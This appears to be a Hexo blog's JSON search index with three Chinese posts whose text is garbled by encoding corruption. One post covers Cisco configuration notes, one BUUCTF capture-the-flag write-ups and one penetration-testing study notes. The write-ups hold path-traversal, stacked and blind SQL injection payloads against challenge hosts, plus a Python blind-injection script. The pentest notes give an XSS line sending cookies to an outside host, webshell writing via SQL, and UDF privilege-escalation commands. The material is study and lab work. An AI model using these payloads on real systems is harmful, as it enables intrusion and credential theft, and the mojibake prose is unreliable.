{"meta":{"title":"fxxy","subtitle":"","description":"åŠ›äº‰ä¸‹æ¸¸ã€‚","author":"fxxy","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2021-10-22T09:48:59.000Z","updated":"2021-10-22T09:52:15.629Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"link","date":"2021-10-22T09:49:12.000Z","updated":"2021-10-22T09:49:12.713Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"category","date":"2021-10-22T03:54:08.425Z","updated":"2021-10-22T03:54:08.403Z","comments":true,"path":"category/index.html","permalink":"http://example.com/category/index.html","excerpt":"","text":""},{"title":"about","date":"2021-10-22T09:50:16.000Z","updated":"2021-10-22T09:50:16.531Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""}],"posts":[{"title":"ç½‘ç»œè®¾å¤‡æœŸæœ«","slug":"ç½‘ç»œè®¾å¤‡","date":"2020-06-26T16:00:00.000Z","updated":"2021-10-22T08:34:41.328Z","comments":true,"path":"2020/06/27/ç½‘ç»œè®¾å¤‡/","link":"","permalink":"http://example.com/2020/06/27/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/","excerpt":"ç½‘ç»œè®¾å¤‡é…ç½®æœŸæœ«å¤ä¹ ç¬”è®°ã€‚ã€‚","text":"ç½‘ç»œè®¾å¤‡é…ç½®æœŸæœ«å¤ä¹ ç¬”è®°ã€‚ã€‚ é…ç½®ä¸‰å±‚äº¤æ¢æœº123456789101112131415# ä¸‰å±‚äº¤æ¢æœºä¸å…¶ä»–äº¤æ¢æœºè”é€šip routing int ä¸äº¤æ¢æœºè¿æ¥çš„æ¥å£switchport trunk encapsulation dot1qswitchport mode trunk# é…ç½®ç½‘å…³ è”é€šå…¶ä»–vlanint vlan 2ip address 26.1.2.1ï¼ˆç½‘å…³ï¼‰ 255.255.255.0no shutdown# é…ç½®è‡ªå·±çš„vlanæ—¶æ˜¯ç”¨è‡ªå·±çš„IP å…¶ä»–äº‹ç½‘å…³ ç«¯å£èšåˆ1234interface port-channel 1interface range f0/switchport mode trunkchannel-group 1 mode on s12345678access-list 101 peimit tcp 26.1.2.0ï¼ˆä¸è¢«å…è®¸çš„æœºå™¨ï¼‰ 0.0.0.255 host 26.1.4.7(æœåŠ¡å™¨) eq wwwaccess-list 101 peimit tcp 26.1.2.0ï¼ˆä¸è¢«å…è®¸çš„æœºå™¨ï¼‰ 0.0.0.255 host 26.1.4.7(æœåŠ¡å™¨) eq wwwsource-list 101 permit icmp anyint f0/ip access-group 101 in / out è®¾ç½®ç”Ÿæˆæ ‘ æ‰“å¼€ç”Ÿæˆæ ‘åè®®ï¼ˆåªåœ¨ä¸‰å±‚äº¤æ¢æœºä¸­è®¾ç½®ï¼‰ 12spanning-tree vlan 1 (é»˜è®¤ä¸º1)spanning-tree mode rapid-pvst å…³é—­vlançš„ç”Ÿæˆæ ‘åè®® 1no spanning-tree vlan 10 //æŠŠè‡ªå·±åˆ›å»ºçš„vlanå…³äº† è®¾ç½®ä¸‰å±‚äº¤æ¢æœºä¸ºæ ¹äº¤æ¢æœº 1spanning-tree vlan 1 root primary é…ç½®ospfäº¤æ¢æœºç›¸è¿çš„ç«¯å£éœ€æ”¹ä¸ºtrunkæ¨¡å¼ï¼Œä¸¤å°ä¸‰å±‚äº¤æ¢æœºè®¾ç½®ä¸ºä¸€ä¸ªç½‘æ®µçš„IPï¼ŒåŠ ä¸€ä¸ªå…¬ç”¨çš„vlan100ï¼Œå†è®¾ç½®ç«¯å£ int vlan 100ip address 26.1.100.1ï¼ˆè·¯ç”±IPï¼‰ 255.255.255.0no shutdown //ä½œç”¨äºä¸¤å°ä¸‰å±‚äº¤æ¢æœºï¼Œä½¿ä¸¤ç«¯äº’é€š 123456router ospf 1# åˆ†åˆ«å°†æ¯ä¸ªvlançš„IPåŠ è¿›æ¥network 26.1.2.0 0.0.0.255 area 0åˆ é™¤no network è®¾ç½®é™æ€è·¯ç”±éœ€è¦å…ˆé…ç½®s0/2çš„IP ospfä½¿å„ä¸ªç«¯å£å¯ä»¥è”é€š å†…ç½‘å‡ºå» 1ip route 201.168.1.0(éœ€è¦è®¿é—®çš„å¤–ç½‘æœåŠ¡å™¨IP) 255.255.255.0ï¼ˆç½‘å…³ï¼‰ 26.1.2.254 ï¼ˆä¸‹ä¸€ä¸ªè·¯ç”±ï¼‰ NATé…ç½®å†…å¤–ç½‘12345int s2/0 ip nat outsideint f0/0ip nat inside é…ç½®åŠ¨æ€è·¯ç”±123access-list i peimit 26.1.2.0 0.0.0.255nat pool 1(ä»£ç†æ± åç§°) 200.168.1.10(æœ€å°ç½‘æ®µ) 200.168.1.20(æœ€å¤§ç½‘æ®µ) netmask 255.255.255.0ip nat inside source list 1 pool 1 é…ç½®telnet è¿‡æ»¤123456access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 22access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 10.2.63.3 eq 23access-list 101 permit ip any any int s0/0/0ip access-group 101 inexit é…ç½®httpã€ftpè¿‡æ»¤1234567access-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq wwwaccess-list 101 deny tcp 172.16.63.0 0.0.0.255 host 192.168.63.100 eq ftpaccess-list 101 permit ip any anyint s0/0/0ip access-group 101 inexit","categories":[],"tags":[]},{"title":"BUUctfå¹³å°","slug":"buuctfåˆ·é¢˜","date":"2020-06-09T16:00:00.000Z","updated":"2021-10-22T08:34:14.870Z","comments":true,"path":"2020/06/10/buuctfåˆ·é¢˜/","link":"","permalink":"http://example.com/2020/06/10/buuctf%E5%88%B7%E9%A2%98/","excerpt":"åˆ·çš„ä¸€äº›é¢˜","text":"åˆ·çš„ä¸€äº›é¢˜ [HCTF 2018]WarmUpf12æºç çœ‹åˆ°source.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; //å£°æ˜ç™½åå•ä¸ºsource.php hint.php $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; //æˆªå–fileå­—æ®µä¸­ï¼Œå¼€å¤´åˆ°å‡ºç°?çš„éƒ¨åˆ† $_page = mb_substr( $page, 0, //ï¼Ÿåœ¨fileå­—æ®µä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½® mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); // $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; å…ˆææ¸…æ¥šä»£ç ï¼Œ$_REQUEST[â€˜fileâ€™]è·å–è¯·æ±‚ä¸­çš„fileæŸ¥è¯¢å‚æ•°ï¼Œç„¶åç”¨checkFile()è¿›è¡Œæ£€æŸ¥ï¼Œæ˜¯å¦æ˜¯hint.phpæˆ–è€…source.phpï¼Œè‹¥æ˜¯è¿™ä¸¤ä¸ªphpåˆ™è¾“å‡ºç›¸åº”å†…å®¹ åˆ©ç”¨ç‚¹åœ¨è¿™2ä¸ªåœ°æ–¹ 123456789101112$_page = mb_substr( $page, 0, //ï¼Ÿåœ¨fileå­—æ®µä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½® mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); mb_substr()ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œæˆªå– mb_strpos()ï¼šæŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²åœ¨è¢«æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ³¨æ„å™¢ï¼æ˜¯ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè€Œä¸”åœ¨æŸ¥æ‰¾æ—¶ï¼Œä»–ä¼šè‡ªåŠ¨ç»™åŸå­—ç¬¦ä¸²çš„æœ«å°¾åŠ ä¸Š? åœ¨æœ¬åœ°å†™ä¸ªdemoçœ‹ä¸€ä¸‹ æ­£å¸¸æ—¶ï¼š ä¸æ­£å¸¸æ—¶ï¼š ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡æˆ‘åé¢ä¼šåŠ å¤šå°‘ä¸ªé—®å·ï¼Œå¤šå°‘ä¸ªå‚æ•°ï¼Œä»–æœ€ç»ˆæˆªå–å‡ºæ¥æ¯”å¯¹çš„ï¼Œåªä¼šæ˜¯ç¬¬ä¸€ä¸ª?å‡ºç°ä¹‹å‰çš„å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥è¿™æ ·ç»•è¿‡ 1?file=source.php?payload ç„¶åhint.phpä¸­è¯´ï¼Œflagåœ¨ffffllllaaaaggggä¸­ï¼Œä¸‹é¢ä¾æ¬¡å‘ä¸Šä¾¿åˆ©ç›®å½• åœ¨ç¬¬å››æ¬¡çš„æ—¶å€™å‡ºæ¥äº† 1?file=hint.php?/../../../../ffffllllaaaagggg [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ æ³¨å…¥ç‚¹: 1http://07494cc4-964e-492d-82b1-180e7cc2beef.node3.buuoj.cn/?inject=1&#x27; -- - å­—æ®µå€¼ä¸º2 ä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œè¿‡æ»¤äº†selectï¼Œupdateï¼Œdeleteï¼Œdropï¼Œinsertï¼Œwhereä¸”å¤§å°å†™ç»•ä¸è¿‡ ç”¨æŠ¥é”™æ³¨å…¥è¯•è¯•è·å–æ•°æ®åº“å’Œç”¨æˆ· æ•°æ®åº“ï¼šsupersqli ç”¨æˆ·ï¼šroot@localhost è¿‡æ»¤äº†å¾ˆå¤šå…³é”®è¯ï¼Œä¸‹é¢ä¸çŸ¥é“æ€ä¹ˆåŠäº†ï¼Œç„¶ååœ¨å±±å¸ˆå‚…çš„æé†’ä¸‹ï¼Œç”¨äº†å †å æ³¨å…¥ã€‚ è·å–æ•°æ®åº“ è·å–æ•°æ®è¡¨ 1http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show tables; -- - è·å–å­—æ®µå 12http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from words -- -http://c9315ef2-a6b3-44c3-b885-430de3fb1477.node3.buuoj.cn/?inject=1&#x27; ; use supersqli; show columns from `1919810931114514` -- - flagè‚¯å®šæ˜¯åœ¨1919810931114514è¿™ä¸ªè¡¨é‡Œé¢ï¼Œä½†æ˜¯è¿‡æ»¤selectåˆä¸çŸ¥é“è¯¥å’‹åŠäº†ï¼Œçœ‹äº†ä¸€ä¸‹WPï¼Œä¸€ç§æ–¹æ³•æ˜¯ç½®æ¢è¡¨åå’Œåˆ—åï¼Œå› ä¸ºæ­£å¸¸æŸ¥è¯¢çš„è¯­å¥è‚¯å®šä¸º 1select * from word where id = &#x27;&#x27; é‚£å¦‚æœæˆ‘ä»¬æŠŠå­˜æœ‰flagçš„è¡¨åæ¢æˆwordå°±å¯ç”¨ 1alter table words rename to words1;alter table` 1919810931114514` rename to words;alter table words change flag id varchar(50); -- - [SUCTF 2019]EasySQLè¿‡æ»¤å­—ç¬¦ â€œ and or order union like å †å æ³¨å…¥ è·å–æ•°æ®åº“ test ctftraining 1query=1;show databases; æœ¬æ¥æƒ³ä¸€ä¸ªä¸€ä¸ªè¯•ä¸€ä¸‹æ¯ä¸ªæ•°æ®åº“ä¸­éƒ½æœ‰å“ªäº›è¡¨çš„ï¼Œä½†æ˜¯ 1query=1;use test;show tables; è¿™ä¸ªè¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œé‚£å°±showä¸€ä¸‹å½“å‰è¿™ä¸ªæ•°æ®åº“æœ‰ä»€ä¹ˆè¡¨å­ 1query=1;show tables; å°è¯•è·å–åˆ—åç§° 1show columns from falg åˆè¢«è¿‡æ»¤äº†ã€‚ã€‚ã€‚ æ€è€ƒï¼šflagè¡¨å°±åœ¨è¿™ä¸ªæ•°æ®åº“ä¸‹é¢ï¼Œè¯´æ˜æˆ‘ä»¬è¦çš„ä¸œè¥¿å°±åœ¨è¿™é‡Œï¼Œå‰é¢æµ‹è¯•çš„æ—¶å€™ï¼Œä¸ç®¡è¾“å…¥çš„queryæ˜¯å¤šå°‘ï¼Œè¾“å‡ºçš„éƒ½åªæœ‰1çŒœæµ‹åç«¯çš„sqlè¯­å¥ä¸º 1select 1 from flag æˆ‘ä»¬æƒ³å¾—åˆ°flagè¡¨çš„å†…å®¹çš„è¯ï¼Œè¯­å¥åº”è¯¥ä¸º 1select * from flag æ„é€ ä¸€ä¸‹ï¼Œquery=*,1è¿™æ ·è¯­å¥å°±ä¼šå˜ä¸º 1select *,1 from flag ç„¶åæˆåŠŸå¾—åˆ°flag é”™è¯¯ å®˜æ–¹WPé‡Œçš„åšæ³•æ˜¯è¿™æ ·çš„ï¼Œç”¨äº†ä¸€ä¸ªsql_modeå˜é‡ï¼Œæœ¬æ¥çš„æŸ¥è¯¢è¯­å¥åº”ä¸º 1select $POST[&#x27;query&#x27;] || flag from flag; æ­£å¸¸çš„è¯ï¼Œä»–åº”è¯¥æ˜¯è¿™æ · è€Œä¸”å‰é¢æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œæœ‰é»‘åå•è¿‡æ»¤è¾“å…¥å­—ç¬¦ä¸²æ—¶ä¼šå‡ºé”™ï¼Œè€Œä¸”è¾“å…¥çš„æ­£ç¡®çš„ä¸œè¥¿æ—¶ï¼Œå›æ˜¾çš„æ°¸è¿œæ˜¯1ï¼Œé‚£è¿™æ ·ä¸Šé¢é‚£ä¸ªè¯­å¥ä¹Ÿè¯´çš„é€šäº†ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ mysqlä¸­æœ‰ä¸ªsql_modeå˜é‡ï¼Œè¿™ä¸ªå˜é‡æœ‰ä¸ªå€¼ï¼Œæ˜¯pipes_as_concatã€‚æ„æ€å°±æ˜¯å°†ç®¡é“ç¬¦å½“ä½œè¿æ¥ç¬¦ï¼Œå°†ç»™å®šçš„å­—ç¬¦æ‹¼æ¥åˆ°æŸ¥è¯¢çš„å˜é‡ï¼Œæµ‹è¯•ä¸€ä¸‹ æ‰€ä»¥ï¼Œæ­£ç¡®è§£æ³•åº”è¯¥æ˜¯ 1query=1;set sql_mode=pipes_as_concat;select 1 å¯ä»¥çœ‹åˆ°å¯¹1è¿›è¡Œäº†æ‹¼æ¥ã€‚ æå®¢å¤§æŒ‘æˆ˜ easysqlæ³¨å…¥ç‚¹åœ¨usernameå‚æ•° 1?username=1&#x27; or 1=1 order by 4 -- - å­—æ®µæ•°ï¼š3 ä¸€ç•ªæµ‹è¯•å‘ç°å¸ƒå°”ç›²æ³¨ å†™è„šæœ¬æ³¨å‡ºæ•°æ®åº“ä¸ºgeek æ•°æ®åº“å è¡¨å åæ¥ç”¨è¿™ä¸ªgeekusseræ³¨åˆ—åçš„æ—¶å€™ï¼ŒæŠ˜è…¾äº†å¥½ä¹…éƒ½æ²¡æœ‰ï¼Œç„¶ååœ¨æµè§ˆå™¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ï¼Œä¸€ä¸å°å°å‡ºæ¥äº†ã€‚ã€‚ã€‚æˆ‘æŠŠè¡¨åæ”¹æˆäº†geekuser 1http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 0,1),1,1))&lt;125,1,0) -- - &amp;password=1&#x27; or 1=1 é‚£è®©æˆ‘ä»¬æ­£å¸¸æ³¨ä¸€ä¸‹ åˆ—å id username password è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestszidian = &#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\\;&#123;$%&amp;*()&#125;&#x27;url = &quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;def get_res(): result = &#x27;&#x27; for i in range(1,10): for j in zidian: print(j) #è·å–æ•°æ®åº“å #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- -&amp;password=1&#x27; or 1=1 &quot;.format(i,ord(j)) #è·å–æ•°æ®è¡¨å æ§åˆ¶limitè·å–å…¶ä»–è¡¨ #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;),1,0) -- - &amp;password=1&#x27; or 1=1 &quot;.format(i,ord(j)) #è·å–å­—æ®µå #payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;geekuser&#x27; limit 3,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1&#x27; or 1=1&quot;.format(i,ord(j)) #è·å–å­—æ®µå€¼ payload = &quot;http://4700bcda-d7ff-4598-a011-d53dff3c4237.node3.buuoj.cn/check.php?username=1&#x27; or 1=1 and if(ascii(substr((select password from geekuser limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- - &amp;password=1&#x27; or 1=1&quot;.format(i,ord(j)) print(payload) flag = requests.get(payload) if &quot;Success&quot; in flag.text: result = result + j print(result) print(result) #return resultprint(get_res())# payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),1,1))=115,1,0) -- -&#x27;# flag = requests.get(payload)# print(flag.text)# if &quot;You are in&quot; in flag.text:# #dbname += j# print(45678) [RoarCTF 2019]Easy Calcè¡¨é¢ä¸Šæ˜¯ä¸ªè®¡ç®—é¢˜ã€‚ã€‚ çœ‹æºç å‘ç°æœ‰ä¸ªcalc.php è®¿é—®ä¸€ä¸‹ï¼Œçœ‹åˆ°æºç  123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; æœ‰ä¸ªevalå‡½æ•°ï¼ï¼ï¼ä½†æ˜¯è¦ç»•è¿‡å‰é¢çš„é™åˆ¶ï¼Œnumå˜é‡ä¸­ä¸èƒ½åŒ…å«ç©ºæ ¼ã€æ–œæ ç­‰ è€Œä¸”ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå½“numå˜é‡ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šforbiddenã€‚ã€‚åŸç½‘é¡µä»£ç ä¸­æœ‰å¥è¯ï¼Œæœ‰wafã€‚ã€‚ ä¸ä¼šäº†ï¼Œçœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„WPï¼ŒçŸ¥é“äº†ä¸€ä¸ªPHPè§£ææ¼æ´ã€‚ phpè§£ææ¼æ´ å½“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GET[â€˜â€™]æˆ–$__POST[]å…³è”æ•°ç»„æ—¶ï¼Œåœ¨å°†æŸ¥è¯¢å­—ç¬¦ä¸²è¿›è¡Œè§£ææ—¶ï¼Œä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿æ›¿ä»£ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¾“å…¥ %20num (%20ä¸ºç©ºæ ¼çš„URLç¼–ç )æ—¶ï¼Œåœ¨PHPè¿›è¡Œè§£ææ—¶ï¼Œä¼šè‡ªåŠ¨è§£æä¸ºnum ä¾‹å­1 test.php 12345&lt;?php $str = $_GET[&#x27;test&#x27;]; echo $str;?&gt; å‚è§æ–‡ç« ï¼šhttps://www.anquanke.com/post/id/181682 ç°åœ¨æˆ‘ä»¬æœ‰ç»•è¿‡WAFçš„æ–¹æ³• 1?%20num=phpinfo() æ‰«ææ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯/è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨chr(47)ç»•è¿‡ï¼Œ47æ˜¯/çš„asciiç  1?%20num=var_dump(scandir(chr(47))) payload 1? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) [HCTF 2018]admin","categories":[],"tags":[]},{"title":"æ¸—é€æµ‹è¯•å­¦ä¹ ç¬”è®°","slug":"æ¸—é€æµ‹è¯•å­¦ä¹ ç¬”è®°","date":"2020-04-29T16:00:00.000Z","updated":"2021-10-22T08:35:17.659Z","comments":true,"path":"2020/04/30/æ¸—é€æµ‹è¯•å­¦ä¹ ç¬”è®°/","link":"","permalink":"http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"ç¬”è®°ã€‚","text":"ç¬”è®°ã€‚ æ­¥éª¤ å‰æœŸäº¤äº’ ç¡®å®šé¡¹ç›®æœºèŒƒå›´ ä¿¡æ¯æ”¶é›† æ”¶é›†ç›®æ ‡ç›¸å…³çš„èµ„äº§ä¿¡æ¯ï¼ŒåŒ…æ‹¬åŸŸåã€IPã€é‚®ç®±ã€é˜²å¾¡ç­‰ å¨èƒå»ºæ¨¡ åˆ©ç”¨å·²ç»æ”¶é›†çš„ä¿¡æ¯å¯¹ç›®æ ‡èµ„äº§è¿›è¡Œåˆ†æï¼Œè·å–å…¶å¯èƒ½å­˜åœ¨çš„å¨èƒï¼Œå¹¶è§„åˆ’æ”»å‡»è·¯å¾„ æ¼æ´åˆ†æ å‘ç°ç›®æ ‡ç³»ç»Ÿä¸­å­˜åœ¨çš„æ¼æ´ æ¼æ´åˆ©ç”¨ å¯¹å·²å‘ç°çš„æ¼æ´ä½¿ç”¨æ”»å‡»å‘é‡è¿›è¡Œæ”»å‡» åæ¸—é€ å»ºç«‹ç«‹è¶³ç‚¹ï¼Œè¿›è¡Œæƒé™ç»´æŒä»¥åŠå†…ç½‘æ¸—é€ï¼Œè·å–æŒ‡å®šçš„æ¸—é€ç›®æ ‡æ•°æ®ï¼Œæƒé™ç­‰ã€‚æ¸…ç†ç—•è¿¹ æŠ¥å‘Š ç¼–å†™æ¸—é€æµ‹è¯•æŠ¥å‘Š ä¿¡æ¯æ”¶é›†ä¿¡æ¯æ”¶é›†çš„è¶Šå¤šï¼Œæ„å‘³ç€æ”»å‡»çš„èŒƒå›´è¶Šå¹¿ å¸¸è§å…³é”®ä¿¡æ¯ åŸŸåã€å­åŸŸå IPåŠç«¯å£ åŸŸåå†å²è§£æIP åº”ç”¨æœåŠ¡ç³»ç»Ÿã€ç‰ˆæœ¬ å¼€æºæƒ…æŠ¥ æœåŠ¡ç«¯æ¡†æ¶ï¼Œè¯­è¨€ IPåå‘æŸ¥è¯¢åŸŸå è‡ªåŠ¨åŒ–å·¥å…·å†…ç½®åœ¨kaliä¸­ Maltegoï¼šhttps://www.paterva.com Maltego æ•™ç¨‹ï¼šhttps://www.jianshu.com/p/93ab0265375b Recon-Ngï¼šhttps://bitbucket.org/LaNMaSteR53/recon-ng.git Recon-Ng æ•™ç¨‹ï¼šhttps://www.freebuf.com/sectool/141544.html theHarvesterï¼šhttps://github.com/laramies/theHarvester theHarvester æ•™ç¨‹ï¼šhttps://cloud.tencent.com/developer/news/47698 æ¼æ´å‘ç°ä¸»è¦ä»¥ä¸‹å››ä¸ªæ–¹é¢ ä¼ ç»Ÿæ¼æ´ åˆ©ç”¨é€šç”¨æ¼æ´ å¼±å£ä»¤ç­‰ç›®æ ‡è„†å¼±ç‚¹ ä»£ç å®¡è®¡ æ¸—é€SQLæ³¨å…¥ å¯»æ‰¾æ³¨å…¥ç‚¹ æ³¨å…¥æ–¹å¼ XSSbluecms æ‰¾åå° æ‰‹å·¥ï¼šadminã€manage å·¥å…·ï¼šå¾¡å‰‘ &lt;img/src=x&gt; &lt;svg/onload=x &gt; alert(1) 1&lt;script&gt;new Image().src =&quot;http://www.domin.com?log.php?c=&quot; + encodeURI(document.cookie);&lt;/script&gt; ç»•è¿‡é•¿åº¦é™åˆ¶ å¼•å…¥å¤–éƒ¨è„šæœ¬ çŸ­é“¾æ¥ dwz.cn æ­¥éª¤ å‘ç°xssåˆ©ç”¨ç‚¹ æ„é€ xss paloadè·å–ç®¡ç†å‘˜cookie åˆ©ç”¨ç®¡ç†å‘˜cookieè¿›è¡Œç®¡ç†é¡µé¢ç™»å½• ç™»é™†ååå°æŸ¥çœ‹æœ‰æ— ä¸Šä¼ æ–‡ä»¶æƒé™è¿›è¡Œwebshellä¸Šä¼  å¦å¤–å¯å€ŸåŠ©ä¸€äº›XSSå¹³å°ç›‘å¬æ”¾çš„ã€é’“é±¼é“¾æ¥ã€‘ æ•°æ®åº“æƒé™mysql å†™webshell select into outfile UDFææƒ MOFææƒ é…ç½®phpmyadminæ—¥å¿—è·å–webshell general log general log file è®°å½•sqlæŸ¥è¯¢è®°å½•ï¼Œé»˜è®¤åœ¨./dataç›®å½•ä¸‹ sqlserver å­˜å‚¨è¿‡ç¨‹æ‰§è¡Œå‘½ä»¤ sqlå†™å…¥webshellæ¡ä»¶ å½“å‰æ•°æ®åº“ç”¨æˆ·æœ‰æ–‡ä»¶è¯»å†™æƒé™ é¡»é…ç½® secure_file_priv çŸ¥é“ç»å¯¹è·¯å¾„ä¸”å¯å†™å¯æ‰§è¡Œ å•åŒå¼•å·å¯ä»¥æ­£å¸¸ä½¿ç”¨ è·å–ç»å¯¹è·¯å¾„æ–¹å¼ æŠ¥é”™ä¿¡æ¯ phpinfoã€æ¢é’ˆç­‰æ–‡ä»¶ å¸¸è§„ç›®å½• ç»ƒä¹ ï¼šblucms admin/nav.php è‹¥æ–‡ä»¶å¤¹æ— å¯å†™æƒé™ï¼Œå¯é€šè¿‡æ–‡ä»¶ä¸Šä¼ å¯»æ‰¾å¯å†™å…¥è·¯å¾„ hexç¼–ç ç»•è¿‡ï¼Œè¿™æ ·å¯ä¸ç”¨å¼•å·æŠŠå†…å®¹æ‹¬èµ·æ¥ ç»ƒä¹ é¶åœº http://47.106.80.112:8235/ ææƒç›®å½•æ‰«æå·¥å…· å¾¡å‰‘ OWASP dirbrute burpsuite webpathbrute mysqlææƒ UDFææƒ MOFææƒ UDFææƒ å®æˆ˜5ï¼šudfææƒ Userdefined Functionï¼šæ˜¯ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œmysqlä¸ºç”¨æˆ·æä¾›çš„ä¸€ä¸ªæ‰©å±•åŠŸèƒ½çš„æ¥å£ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ç¼–å†™ä»£ç çš„æ–¹å¼ç¼–è¯‘æˆ.so.dllæ–‡ä»¶ï¼Œä½¿ç”¨è‡ªå®šä¹‰å‡½æ•° ä½¿ç”¨æ¡ä»¶ mysql &gt; 5.1 .so .dllæ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„pluginç›®å½•ä¸‹ æœ‰create functionæƒé™ è·å–pluginç›®å½•ï¼š@@plugin_dir æ­¤ç§æ–¹æ³•Windowsä¸‹æ˜“ç”¨ å·¥å…·åœ°å€ï¼šlib_mysqludf_sysï¼šhttps://github.com/mysqludf/lib_mysqludf_sys å…ˆå°†ä»“åº“cloneåˆ°æœ¬åœ° 1git clone https://github.com/mysqludf/lib_mysqludf_sys ç”Ÿæˆexp 1gcc -Wall -l /www/mysql/include -Os -shared lib_mysqludf_sys.c -fPIC -o udf.so å°†ç”Ÿæˆçš„æ–‡ä»¶åå…­è¿›åˆ¶ç¼–ç  1select hex(load_file(&#x27;/tmp/udf.so&#x27;)) è·å–pluginç›®å½• 1select @@plugin_dir 